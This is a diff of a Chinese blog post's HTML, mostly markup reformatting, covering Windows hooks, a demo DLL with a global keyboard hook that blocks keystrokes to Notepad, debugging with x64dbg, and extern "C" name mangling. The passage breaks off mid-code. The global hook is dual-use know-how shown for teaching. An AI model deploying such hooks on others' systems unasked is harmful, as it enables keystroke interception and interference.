@@ -48,7 +48,7 @@
 <meta property="og:image" content="http://mamor5409.github.io/posts/71edaaad/11-5.png">
 <meta property="og:image" content="http://mamor5409.github.io/posts/71edaaad/11-6.png">
 <meta property="article:published_time" content="2022-10-01T07:32:26.000Z">
-<meta property="article:modified_time" content="2022-10-08T04:40:48.678Z">
+<meta property="article:modified_time" content="2022-10-08T04:40:48.000Z">
 <meta property="article:author" content="Mamor">
 <meta property="article:tag" content="C">
 <meta name="twitter:card" content="summary">
@@ -285,7 +285,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>6.4k</span>
+              <span>6.5k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -305,22 +305,31 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p><strong>Windows HooK钩子技术是指基于Windows中窗口的程序的消息处理机制，对系统或者进程中的消息进行截获和处理，并将截获和处理的消息在重新处理和发送，使其可以实现不同的功能。</strong></p>
+        <p><strong>Windows
+HooK钩子技术是指基于Windows中窗口的程序的消息处理机制，对系统或者进程中的消息进行截获和处理，并将截获和处理的消息在重新处理和发送，使其可以实现不同的功能。</strong></p>
 <p>钩子技术分为<strong>系统钩子</strong>技术和<strong>线程钩子</strong>技术</p>
-<p><strong>系统钩子</strong>：是用于监视系统中的消息的钩子技术，因为系统钩子会影响系统中所有的应用程序，所以钩子函数必须放在独立的动态链接库(DLL) 中。做好之后使用其他程序将钩子挂载到系统的进程中。</p>
+<p><strong>系统钩子</strong>：是用于监视系统中的消息的钩子技术，因为系统钩子会影响系统中所有的应用程序，所以钩子函数必须放在独立的动态链接库(DLL)
+中。做好之后使用其他程序将钩子挂载到系统的进程中。</p>
 <p><strong>线程钩子</strong>：指的是对指定线程进行监视。</p>
 <p><strong>钩子原理</strong></p>
 <p>在使用钩子技术的时候，WINDOWS会先在内存中创建一个数据结构，该数据结构包含了钩子的相关信息，然后把该结构体加到已经存在的钩子链表中去。新的钩子将加到老的前面。</p>
 <p>当系统触发产生一个消息时，如果安装的是一个线程钩子，进程中的钩子函数将被调用。</p>
 <p>如果是一个系统钩子，系统就必须把钩子函数插入到其它进程的地址空间，要做到这一点要求钩子函数必须在一个动态链接库中，所以如果想要使用系统钩子，就必须把该钩子函数放到动态链接库中去。</p>
-<h4 id="Hook-函数及类型"><a href="#Hook-函数及类型" class="headerlink" title="Hook 函数及类型"></a>Hook 函数及类型</h4><h5 id="钩子类型"><a href="#钩子类型" class="headerlink" title="钩子类型"></a>钩子类型</h5><table>
+<h4 id="hook-函数及类型">Hook 函数及类型</h4>
+<h5 id="钩子类型">钩子类型</h5>
+<table>
+<colgroup>
+<col style="width: 22%">
+<col style="width: 77%">
+</colgroup>
 <thead>
 <tr>
 <th>值</th>
 <th>含义</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td>WH_MSGFILTER</td>
 <td>截获用户与控件交互的消息</td>
 </tr>
@@ -344,42 +353,67 @@
 <td>WH_CALLWNDPROCRET</td>
 <td>截获目标窗口处理完毕的消息</td>
 </tr>
-</tbody></table>
-<h5 id="SetWindowsHookEx-设置钩子"><a href="#SetWindowsHookEx-设置钩子" class="headerlink" title="SetWindowsHookEx() 设置钩子"></a>SetWindowsHookEx() 设置钩子</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WINUSERAPI</span><br><span class="line">HHOOK</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">SetWindowsHookEx</span><span class="params">(</span></span><br><span class="line"><span class="params">     <span class="comment">//钩子类型</span></span></span><br><span class="line"><span class="params">    _In_ <span class="type">int</span> idHook,</span></span><br><span class="line"><span class="params">    <span class="comment">//回调函数地址</span></span></span><br><span class="line"><span class="params">    _In_ HOOKPROC lpfn,</span></span><br><span class="line"><span class="params">    <span class="comment">//实例句柄(包含有钩子函数)</span></span></span><br><span class="line"><span class="params">    _In_opt_ HINSTANCE hmod,</span></span><br><span class="line"><span class="params">    <span class="comment">//线程ID，欲勾住的线程（为0则不指定，全局）</span></span></span><br><span class="line"><span class="params">    _In_ DWORD dwThreadId)</span>;</span><br></pre></td></tr></table></figure>
-
-<h5 id="UnhookWindowsHookEx-卸载钩子"><a href="#UnhookWindowsHookEx-卸载钩子" class="headerlink" title="UnhookWindowsHookEx()卸载钩子"></a><code>UnhookWindowsHookEx()</code>卸载钩子</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">WINUSERAPI</span><br><span class="line">BOOL</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">UnhookWindowsHookEx</span><span class="params">(</span></span><br><span class="line"><span class="params">     <span class="comment">//要删除的钩子的句柄。这个参数是上一个函数SetWindowsHookEx的返回值.</span></span></span><br><span class="line"><span class="params">    _In_ HHOOK hhk)</span>;</span><br></pre></td></tr></table></figure>
-
-<h5 id="CallNextHookEx-将钩子信息传递到当前钩子链中的下一个子程，一个钩子程序可以调用这个函数之前或之后处理钩子信息"><a href="#CallNextHookEx-将钩子信息传递到当前钩子链中的下一个子程，一个钩子程序可以调用这个函数之前或之后处理钩子信息" class="headerlink" title="**CallNextHookEx()** 将钩子信息传递到当前钩子链中的下一个子程，一个钩子程序可以调用这个函数之前或之后处理钩子信息"></a><code>**CallNextHookEx()**</code> 将钩子信息传递到当前钩子链中的下一个子程，一个钩子程序可以调用这个函数之前或之后处理钩子信息</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LRESULT WINAPI <span class="title function_">CallNextHookEx</span><span class="params">(</span></span><br><span class="line"><span class="params">	HHOOK hhk, </span></span><br><span class="line"><span class="params">	<span class="type">int</span> nCode, </span></span><br><span class="line"><span class="params">	WPARAM wParam, </span></span><br><span class="line"><span class="params">	LPARAM lParam)</span>; </span><br></pre></td></tr></table></figure>
-
+</tbody>
+</table>
+<h5 id="setwindowshookex-设置钩子">SetWindowsHookEx() 设置钩子</h5>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WINUSERAPI</span><br><span class="line">HHOOK</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">SetWindowsHookEx</span><span class="params">(</span></span><br><span class="line"><span class="params">     <span class="comment">//钩子类型</span></span></span><br><span class="line"><span class="params">    _In_ <span class="type">int</span> idHook,</span></span><br><span class="line"><span class="params">    <span class="comment">//回调函数地址</span></span></span><br><span class="line"><span class="params">    _In_ HOOKPROC lpfn,</span></span><br><span class="line"><span class="params">    <span class="comment">//实例句柄(包含有钩子函数)</span></span></span><br><span class="line"><span class="params">    _In_opt_ HINSTANCE hmod,</span></span><br><span class="line"><span class="params">    <span class="comment">//线程ID，欲勾住的线程（为0则不指定，全局）</span></span></span><br><span class="line"><span class="params">    _In_ DWORD dwThreadId)</span>;</span><br></pre></td></tr></table></figure>
+<h5 id="unhookwindowshookex卸载钩子"><code>UnhookWindowsHookEx()</code>卸载钩子</h5>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">WINUSERAPI</span><br><span class="line">BOOL</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">UnhookWindowsHookEx</span><span class="params">(</span></span><br><span class="line"><span class="params">     <span class="comment">//要删除的钩子的句柄。这个参数是上一个函数SetWindowsHookEx的返回值.</span></span></span><br><span class="line"><span class="params">    _In_ HHOOK hhk)</span>;</span><br></pre></td></tr></table></figure>
+<h5 id="callnexthookex-将钩子信息传递到当前钩子链中的下一个子程一个钩子程序可以调用这个函数之前或之后处理钩子信息"><code>**CallNextHookEx()**</code>
+将钩子信息传递到当前钩子链中的下一个子程，一个钩子程序可以调用这个函数之前或之后处理钩子信息</h5>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LRESULT WINAPI <span class="title function_">CallNextHookEx</span><span class="params">(</span></span><br><span class="line"><span class="params">	HHOOK hhk, </span></span><br><span class="line"><span class="params">	<span class="type">int</span> nCode, </span></span><br><span class="line"><span class="params">	WPARAM wParam, </span></span><br><span class="line"><span class="params">	LPARAM lParam)</span>; </span><br></pre></td></tr></table></figure>
 <hr>
-<h4 id="Hook-demo"><a href="#Hook-demo" class="headerlink" title="Hook demo"></a>Hook demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	HMODULE dll = LoadLibraryA(<span class="string">&quot;keyboarddll.dll&quot;</span>);</span><br><span class="line">	<span class="type">void</span> (*HookStart)() = (<span class="type">void</span>(*)())GetProcAddress(dll, <span class="string">&quot;HookStart&quot;</span>);</span><br><span class="line">	<span class="type">void</span>(*HookStop)()= (<span class="type">void</span>(*)())GetProcAddress(dll, <span class="string">&quot;HookStop&quot;</span>);</span><br><span class="line">	HookStart();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入q退出卸载钩子\n&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (_getch() != <span class="string">&#x27;q&#x27;</span>);		</span><br><span class="line"></span><br><span class="line">	HookStop();</span><br><span class="line"></span><br><span class="line">	FreeLibrary(dll); <span class="comment">//卸载dll</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HHOOK hHook = <span class="literal">NULL</span>;</span><br><span class="line">HINSTANCE hinstance = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">keyProc</span><span class="params">(<span class="type">int</span> code, WPARAM wparm, LPARAM lparam)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> szBuffer[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span>* p = <span class="literal">NULL</span>;   <span class="comment">//从右侧找 先定义一个指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(lparam &amp; <span class="number">0x80000000</span>)) &#123;          <span class="comment">//32位下  最高位置为1  0x8000 0000</span></span><br><span class="line">            GetModuleFileNameA(<span class="literal">NULL</span>, szBuffer, <span class="keyword">sizeof</span>(szBuffer));</span><br><span class="line">            p = <span class="built_in">strrchr</span>(szBuffer,<span class="string">&#x27;\\&#x27;</span>);   <span class="comment">//从右边找</span></span><br><span class="line">            <span class="keyword">if</span> (!_strcmpi(p+<span class="number">1</span>, <span class="string">&quot;notepad.exe&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(hHook, code, wparm, lparam); <span class="comment">//给下一个钩子处理或者给应用程序</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span> &#123;     <span class="comment">//安装钩子</span></span><br><span class="line">    hHook = SetWindowsHookEx(WH_KEYBOARD, keyProc, hinstance, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span> &#123;     <span class="comment">//卸载钩子</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hHook) &#123;</span><br><span class="line">        UnhookWindowsHookEx(hHook);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                      DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                      LPVOID lpReserved</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    	hinstance = hModule;        <span class="comment">//在载入时获取  后面无法获取</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>使用钩子hook住notepad  由于notepad是64位的，所有要编译成64位应用程序 使用x64dbg进行调试  （没法使用od调试  od只能调试32位）</p>
+<h4 id="hook-demo">Hook demo</h4>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	HMODULE dll = LoadLibraryA(<span class="string">&quot;keyboarddll.dll&quot;</span>);</span><br><span class="line">	<span class="type">void</span> (*HookStart)() = (<span class="type">void</span>(*)())GetProcAddress(dll, <span class="string">&quot;HookStart&quot;</span>);</span><br><span class="line">	<span class="type">void</span>(*HookStop)()= (<span class="type">void</span>(*)())GetProcAddress(dll, <span class="string">&quot;HookStop&quot;</span>);</span><br><span class="line">	HookStart();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入q退出卸载钩子\n&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (_getch() != <span class="string">&#x27;q&#x27;</span>);		</span><br><span class="line"></span><br><span class="line">	HookStop();</span><br><span class="line"></span><br><span class="line">	FreeLibrary(dll); <span class="comment">//卸载dll</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HHOOK hHook = <span class="literal">NULL</span>;</span><br><span class="line">HINSTANCE hinstance = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">keyProc</span><span class="params">(<span class="type">int</span> code, WPARAM wparm, LPARAM lparam)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> szBuffer[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span>* p = <span class="literal">NULL</span>;   <span class="comment">//从右侧找 先定义一个指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(lparam &amp; <span class="number">0x80000000</span>)) &#123;          <span class="comment">//32位下  最高位置为1  0x8000 0000</span></span><br><span class="line">            GetModuleFileNameA(<span class="literal">NULL</span>, szBuffer, <span class="keyword">sizeof</span>(szBuffer));</span><br><span class="line">            p = <span class="built_in">strrchr</span>(szBuffer,<span class="string">&#x27;\\&#x27;</span>);   <span class="comment">//从右边找</span></span><br><span class="line">            <span class="keyword">if</span> (!_strcmpi(p+<span class="number">1</span>, <span class="string">&quot;notepad.exe&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(hHook, code, wparm, lparam); <span class="comment">//给下一个钩子处理或者给应用程序</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span> &#123;     <span class="comment">//安装钩子</span></span><br><span class="line">    hHook = SetWindowsHookEx(WH_KEYBOARD, keyProc, hinstance, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span> &#123;     <span class="comment">//卸载钩子</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hHook) &#123;</span><br><span class="line">        UnhookWindowsHookEx(hHook);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                      DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                      LPVOID lpReserved</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    	hinstance = hModule;        <span class="comment">//在载入时获取  后面无法获取</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用钩子hook住notepad 由于notepad是64位的，所有要编译成64位应用程序
+使用x64dbg进行调试 （没法使用od调试 od只能调试32位）</p>
 <p>打开x64dbg 点击 文件-&gt;附加 附加notepad.exe</p>
-<p><img src="/posts/71edaaad/11-1.png" alt="img"></p>
+<figure>
+<img src="/posts/71edaaad/11-1.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>然后点击 选项-&gt;选项</p>
-<p><img src="/posts/71edaaad/11-2.png" alt="img"></p>
+<figure>
+<img src="/posts/71edaaad/11-2.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>打开dll加载时发生暂停</p>
-<p><img src="/posts/71edaaad/11-3.png" alt="img"></p>
-<p>点击视图-&gt;模块  然后运行钩子 在notepad中随意输入一下 即可看到在x64dbg坐下方载入之前编写的dll</p>
-<p><img src="/posts/71edaaad/11-4.png" alt="img"></p>
+<figure>
+<img src="/posts/71edaaad/11-3.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>点击视图-&gt;模块 然后运行钩子 在notepad中随意输入一下
+即可看到在x64dbg坐下方载入之前编写的dll</p>
+<figure>
+<img src="/posts/71edaaad/11-4.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <hr>
-<h4 id="在DLL编程中，导出函数为什么需要extern-“C”"><a href="#在DLL编程中，导出函数为什么需要extern-“C”" class="headerlink" title="在DLL编程中，导出函数为什么需要extern “C”?"></a>在DLL编程中，导出函数为什么需要extern “C”?</h4><p>使用<code>dumpbin </code> 查看dll的导出函数</p>
+<h4 id="在dll编程中导出函数为什么需要extern-c">在DLL编程中，导出函数为什么需要extern
+"C"?</h4>
+<p>使用<code>dumpbin</code> 查看dll的导出函数</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dumpbin .exports keyboarddll.dll</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/71edaaad/11-5.png" alt="img"></p>
+<figure>
+<img src="/posts/71edaaad/11-5.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>导出函数的修饰方式</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span> &#123;     <span class="comment">//安装钩子</span></span><br><span class="line">    hHook = SetWindowsHookEx(WH_KEYBOARD, keyProc, hinstance, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span> &#123;     <span class="comment">//卸载钩子</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hHook) &#123;</span><br><span class="line">        UnhookWindowsHookEx(hHook);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在前面添加上<code>extern &quot;C&quot;</code> 后再次查看</p>
-<p><img src="/posts/71edaaad/11-6.png" alt="img"></p>
-<p>一般在编写dll的时候 都会使用到这个extern “C” </p>
-<p>extern 为全局函数 ，“C”表示使用C编译器进行编译而不是C++。 C++的编译方式考虑了函数重载，所以对函数名进行了新的修饰，产生了所谓的破坏性命名。</p>
-<p>在编译链接时，C++会按照自己的规则篡改函数的名称，这一过程称为“名字改编”。这会导致不同的编译器、不同的语言下调用dll发生问题。因此我们希望动态链接库文件在编译时，导出函数的名称不要发生变化，可以再定义导出函数时加上限定符：extern “C”</p>
+<p>在前面添加上<code>extern "C"</code> 后再次查看</p>
+<figure>
+<img src="/posts/71edaaad/11-6.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>一般在编写dll的时候 都会使用到这个extern "C"</p>
+<p>extern 为全局函数 ，“C”表示使用C编译器进行编译而不是C++。
+C++的编译方式考虑了函数重载，所以对函数名进行了新的修饰，产生了所谓的破坏性命名。</p>
+<p>在编译链接时，C++会按照自己的规则篡改函数的名称，这一过程称为“名字改编”。这会导致不同的编译器、不同的语言下调用dll发生问题。因此我们希望动态链接库文件在编译时，导出函数的名称不要发生变化，可以再定义导出函数时加上限定符：extern
+“C”</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">	<span class="comment">//extern &quot;C&quot; + _stdcall,函数导出符号为 _CreateNativeManager@0 : _+函数名+@+传参字节数</span></span><br><span class="line">	<span class="comment">//由于_stdcall是被调用方清理堆栈，所以函数符号里面包含了传参的信息</span></span><br><span class="line">	_declspec(dllexport) NativeManager* _stdcall <span class="title function_">CreateNativeManager</span><span class="params">()</span>;</span><br><span class="line">	_declspec(dllexport) <span class="type">void</span> _stdcall <span class="title function_">ReleaseNativeManager</span><span class="params">()</span>;</span><br><span class="line">	_declspec(dllexport) <span class="type">void</span>(_stdcall ExSetLogHandler)(LogHandler handler);</span><br><span class="line">	<span class="comment">//extern &quot;C&quot; + _cdecl,函数导出符号为 ReleaseNativeManager2 : 函数名 </span></span><br><span class="line">	<span class="comment">//由于_cdecl是调用方清理堆栈，所以只需要函数名就可以</span></span><br><span class="line">	_declspec(dllexport) <span class="type">void</span>(_cdecl ReleaseNativeManager2)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不使用extern的情况下，是C++的导出方式，函数符号如下：</span></span><br><span class="line"><span class="comment">//?ReleaseNativeManager1@@YGXH@Z : ?+函数名+@@YG+返回类型+参数1类型...+@Z </span></span><br><span class="line"><span class="comment">//如果是_cdecl @YG变为@YA</span></span><br><span class="line"><span class="comment">//如果没有参数即参数为void,则以Z结尾，例如：</span></span><br><span class="line"><span class="comment">//?ReleaseNativeManager3@@YAXXZ : ?+函数名+@@YA+返回类型+XZ</span></span><br><span class="line"><span class="comment">//以上 X表示 void类型，H表示int参数类型</span></span><br><span class="line">_declspec(dllexport) <span class="type">void</span>(_stdcall 